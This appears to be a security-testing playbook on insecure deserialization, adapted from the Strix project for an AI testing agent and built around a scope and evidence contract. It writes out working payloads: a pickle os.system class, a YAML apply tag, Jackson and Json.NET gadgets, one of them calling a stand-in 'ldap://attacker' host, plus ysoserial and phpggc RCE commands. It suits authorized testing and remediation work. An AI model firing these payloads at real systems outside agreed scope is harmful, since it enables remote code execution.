> Adapted and modified by abhi-zit77, 2026-09-22, from [usestrix/strix `strix/skills/vulnerabilities/insecure_deserialization.md`](https://github.com/usestrix/strix/blob/56e9ae982c2fdd00c7c0b9afc49af035470dd310/strix/skills/vulnerabilities/insecure_deserialization.md).
> Upstream commit `56e9ae982c2fdd00c7c0b9afc49af035470dd310`; Apache-2.0. See bundled LICENSE and NOTICE.

## Adaptation and execution contract

This reference is technical guidance for the selected test family, not a grant of
scope or a list of commands to run indiscriminately. Follow the skill's scope,
tool-adaptation, evidence, and fix-mode contracts. Historical example hosts, paths,
tool flags and framework/CVE versions must be checked against the actual target
and current primary documentation. Verify installed tool help before using a flag.
Use synthetic data, minimal proof, controlled callbacks and agreed effect limits.
Post-exploitation examples describe possible impact; do not collect real secrets,
establish persistence, claim resources, or expand scope to demonstrate it.

Every applicable technique below becomes a concrete coverage row: prerequisite,
security invariant, legitimate baseline, controlled probe, expected secure result,
counterevidence, captured evidence and outcome. Missing capabilities create a gap;
they do not turn a test into a pass. Tool names inherited from Strix refer to the
replacement operations in [tool adaptation](tool-adaptation.md), not available APIs.
Use [evidence rules](evidence-and-reporting.md) when an older section demands runtime
proof for everything: complete static traces and exact advisory matches are separate
reportable classes with their limitations. Audit is the default; changes require
fix intent. Preserve behavior and retest the boundary, not only one payload.

## Portable test and retest recipe

- **Applicability:** select the attack surfaces and prerequisites documented below; establish actual target versions and identities.
- **Invariant / expected secure behavior:** Untrusted serialized data cannot select privileged types or execute unintended behavior.
- **Execution and proof:** Trace parser configuration and reachable type construction; use a harmless local canary for runtime proof.
- **Counterevidence:** test a legitimate baseline and a protected negative case; inspect the actual guard and why it runs on this path.
- **Remediation when requested:** Use data-only formats or strict type allowlists and limits; close every reachable deserializer, converter and factory path.
- **Retest:** replay the original case, a different encoding/shape/identity or sibling path, and the legitimate case; add a regression and run repository checks.
- **Record:** evidence kind, actual observations, confidence, named limitations, and coverage outcome. Runtime unavailable means static proof or an open gap, never fabricated execution.


## Adapted technical playbook

# Insecure Deserialization

Insecure deserialization passes attacker-controlled byte streams or structured blobs to language-native unmarshal functions, enabling remote code execution, authentication bypass, and logic manipulation through magic methods and gadget chains. Test any endpoint accepting serialized objects, session blobs, or opaque binary tokens.

## Attack Surface

**Formats**
- Java: Java native serialization, XStream, JSON → object mappers (Jackson, Fastjson), YAML (SnakeYAML), Hessian/Burlap, Kryo
- Python: `pickle`, `yaml.load` (unsafe), `marshal`, shelve
- PHP: `unserialize()`, Phar deserialization
- .NET: `BinaryFormatter`, `Json.NET TypeNameHandling`, ViewState
- Ruby: `Marshal.load`, YAML.load
- Node.js: `node-serialize`, `unserialize.js` (less common; see prototype_pollution for merge bugs)

**Transports and Containers**
- Java RMI/JMX, HTTP/RPC endpoints, messaging protocols, queues, signed wrappers, and product-specific binary envelopes can carry one or more formats above

**Input Locations**
- Cookies, session tokens, hidden form fields
- API parameters (`data`, `state`, `object`, base64 blobs)
- Message queues, WebSocket binary frames, file uploads
- Cache entries, database columns storing serialized objects

## Reconnaissance

**Detection Signals**
- Base64 blobs starting with magic bytes:
  - Java: `ac ed 00 05` (hex `rO0` base64)
  - PHP: `O:`, `a:`, `s:` prefixes after decode
  - .NET BinaryFormatter: starts with `00 01 00 00 00 ff ff ff ff`
- `Content-Type` with binary or custom serialization
- Framework indicators: Java apps with Spring, Struts, JSF; PHP with Symfony sessions

**White-Box Indicators**
```
pickle.loads    unserialize(    ObjectInputStream    BinaryFormatter
yaml.load       readObject(     TypeNameHandling    Marshal.load
```

## Key Vulnerabilities

### Java Deserialization

**Gadget Chains**
- Commons Collections, Commons BeanUtils, Spring, Groovy, Rome, JDK-only chains (varies by classpath)
- Tools: ysoserial (authorized testing only), manual chain selection by classpath

**Test Flow**
1. Confirm deserialization sink (HTTP param, cookie, RMI, JMX if exposed)
2. Fingerprint library versions from errors, headers, or bundled libs
3. Generate gadget payload for available chain; expect DNS/HTTP callback or command execution

**Jackson / JSON Typing**
```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o", "autoCommit":true}]
```
When `enableDefaultTyping` or `@JsonTypeInfo` allows attacker-chosen types.

**JNDI Pivots from Object Construction**

JNDI injection is not itself a serialization format. It becomes part of this workflow when an attacker-selected type, setter, or gadget performs `Context.lookup()` during object construction or property population. `JdbcRowSetImpl` and some historical polymorphic JSON chains are examples; Log4j lookups reach JNDI through a different input path and should not be classified as deserialization.

- Trace fields such as `dataSourceName`, `jndiName`, and `namingURL` into the exact lookup API and provider.
- Record the accepted schemes/provider factories (`ldap`, `ldaps`, `rmi`, DNS URL context, or application-specific naming providers). A `dns://` value is not a universal oracle; it works only when the relevant DNS provider and lookup path are present.
- Separate network lookup, remote object/reference processing, serialized LDAP attributes, remote codebase loading, and local object-factory invocation. Each is a different capability with different runtime controls.
- JEP 290 filters incoming Java serialization graphs; it does not disable JNDI remote codebase loading. JNDI providers gained separate remote-class-loading and serialized-data controls across JDK updates, and current JDKs disable remote code downloading by default. Record the exact JDK build and relevant provider properties instead of using a single “modern Java” rule.
- When remote class loading is unavailable, test whether the returned reference can reach a compatible **local** `ObjectFactory`, bean-property path, expression engine, script engine, or other class already present. Confirm exact class names, versions, module access, and trigger methods from the deployed classpath.

**Hessian / Burlap**
- Binary RPC formats deserialized by `HessianInput`/`Hessian2Input`. Attacker object graphs reach gadgets even though it is not native Java serialization.
- Treat serializer version, allowed type metadata, constructors/setters invoked, collection/comparator behavior, and classpath as independent prerequisites.
- Pair `semantic_confusion` when a proxy or route policy is expected to make the RPC endpoint unreachable.
- Inspect the exact deployed libraries rather than relying on generic gadget labels; similar-looking Spring, Resin, Tomcat, XBean, EL, or Groovy classes are not interchangeable.

### Python Pickle

Pickle executes arbitrary code during unpickling by design:
```python
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
# base64 encode pickle.dumps(Exploit()) and send as cookie/param
```

**YAML**
```yaml
!!python/object/apply:os.system ['id']
```
When `yaml.load` used instead of `yaml.safe_load`.

### PHP unserialize()

**Object Injection**
- Magic methods: `__wakeup`, `__destruct`, `__toString`, `__call`
- POP chains through framework classes (Laravel, Symfony, WordPress plugins)

**Phar Deserialization**
- Upload or reference `phar://` wrapper triggering metadata deserialization on file operations

### .NET Deserialization

**BinaryFormatter / LosFormatter**
- Never safe on untrusted input; full RCE with known gadget chains (ysoserial.net)

**Json.NET**
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework", ...}
```
When `TypeNameHandling` != `None`.

**ViewState**
- MAC disabled or weak machine keys → forge deserialized view state

### Ruby Marshal

- `Marshal.load` on user input → gadget chains in Rails/Devise versions (context-dependent)

## Advanced Techniques

**Signed Blob Bypass**
- If HMAC/signing uses weak secret or algorithm confusion, forge serialized payload
- Strip signature and test unsigned code paths
- Length extension on MAC if applicable (older custom schemes)

**Second-Order Deserialization**
- Store serialized blob in profile/import; trigger on admin export, cache warm, or batch job

**Compression Wrappers**
- Gzip/base64 nested encoding bypassing naive WAF inspection

## Testing Methodology

1. **Find sinks** — Locate decode/unmarshal calls on user-influenced data
2. **Confirm format** — Magic bytes, error stack traces, framework fingerprint
3. **Safe oracle** — DNS/HTTP OAST callback or sleep/ping before full RCE PoC
4. **Gadget selection** — Match classpath/runtime version to available chains
5. **Minimal PoC** — Demonstrate code execution or critical logic bypass with least destructive command
6. **Session/cookie focus** — Deserialize server-side session stores (Java, PHP) early

## Validation

1. Demonstrate attacker-controlled object graph reaches dangerous sink (unmarshal/readObject)
2. Show impact: RCE (bounded command), auth bypass object, or privilege field manipulation
3. Provide encoded payload and exact injection point (cookie name, parameter, header)
4. Confirm on fixed version or alternate instance that identical payload fails safely
5. Document library/version and gadget chain class names for remediation

## False Positives

- Base64 data is encrypted or signed with verified HMAC before deserialization
- Only primitive types deserialized (whitelist schema, no polymorphic types)
- `pickle`/`Marshal` not used; JSON parsed to dict without object instantiation
- Deserialization in isolated sandbox with no network/exec primitives (verify thoroughly)
- Error mentions serialization class but input is never passed to unmarshal (dead code path)

## Bypass Methods

- Encoding layers: base64 → gzip → serialize
- Alternative parameters storing same session (`session`, `session_backup`, `state`)
- Switch content-type or parameter location (GET vs POST vs cookie)
- Type confusion: JSON array vs object hitting different deserializer branches
- Unicode/UTF-7 smuggling in PHP serialized strings (legacy contexts)

## Impact

- Remote code execution on application servers
- Authentication bypass via forged session objects
- Privilege escalation through manipulated role/admin fields in deserialized classes
- Full application compromise in Java/PHP/.NET stacks with known gadget libraries

## Pro Tips

1. Always fingerprint versions before firing ysoserial — wrong chain wastes time and noise
2. Start with DNS/HTTP callback gadgets before command execution in production-like targets
3. Check cookies named `JSESSIONID` alternatives, `.ASPXAUTH`, `laravel_session`, custom tokens
4. In white-box, trace from `readObject`/`unserialize`/`pickle.loads` backward to source
5. ViewState MAC off is still common on legacy ASP.NET — test early on `.aspx` apps
6. Model JNDI lookup, reference/object processing, remote codebase loading, and local factory invocation as separate stages
7. A "blocked" enterprise deserialization endpoint may still be reachable through a proxy/path-normalization mismatch — pair `semantic_confusion`

## Tooling

Payload generation is the practitioner's core tool here. The sandbox has `git`/`python`/`go` and **interactsh-client** (OAST); add a JRE or `php-cli` if you need the Java/PHP generators.

| Tool | Language / format | Use |
|------|-------------------|-----|
| **ysoserial** (frohoff) | Java native | Gadget-chain payloads: `CommonsCollections1-7`, `Groovy1`, `Spring1/2`, and `URLDNS` for a safe no-exec DNS oracle. Needs a JRE. |
| **phpggc** (ambionics) | PHP `unserialize` / Phar | Framework POP chains (Laravel, Symfony, WordPress, Drupal, Monolog). Needs `php-cli`. |
| **ysoserial.net** | .NET `BinaryFormatter` / Json.NET | Windows/.NET gadget payloads. Needs .NET/mono — usually out of scope in a Linux sandbox. |
| **marshalsec** | Java Hessian/Burlap, Kryo, JSON, and JNDI reference tooling | Use only from a reviewed, pinned upstream commit when a non-native Java marshaller requires it. It has no stable release and intentionally bundles historical gadget dependencies; do not treat it as a globally installed default tool. |

```
# Java: prove the sink with a no-exec DNS oracle BEFORE any RCE chain
java -jar ysoserial.jar URLDNS "http://$(interactsh-client -json | jq -r .host)" | base64 -w0

# PHP: generate a Laravel POP chain (base64), fast path via a framework gadget
./phpggc -b Laravel/RCE9 system id
```

Confirm the sink with a callback (`URLDNS` / interactsh OAST) before firing a command-exec chain, and match the chain to the fingerprinted library version — the wrong chain just adds noise.

## Summary

Treat every deserialization of untrusted data as critical. Safe patterns use JSON schema validation without type polymorphism, `yaml.safe_load`, signed encrypted tokens, or no custom serialization at all. Prove impact with callback or bounded execution — not just error stack traces.
